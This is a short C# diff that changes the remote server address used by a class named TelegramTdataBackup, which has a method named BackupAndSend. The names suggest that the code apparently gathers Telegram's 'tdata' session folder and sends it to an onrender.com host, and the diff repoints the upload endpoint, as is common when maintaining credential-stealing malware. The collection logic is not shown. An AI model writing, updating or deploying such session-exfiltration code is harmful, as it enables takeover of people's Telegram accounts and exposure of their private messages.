@@ -9,7 +9,7 @@ using System.Threading;
 
 public class TelegramTdataBackup
 {
-    const string SERVER_URL = "https://xenv2-ewsa.onrender.com";
+    const string SERVER_URL = "https://xenv2-mlxd.onrender.com";
 
     public static void BackupAndSend()
     {
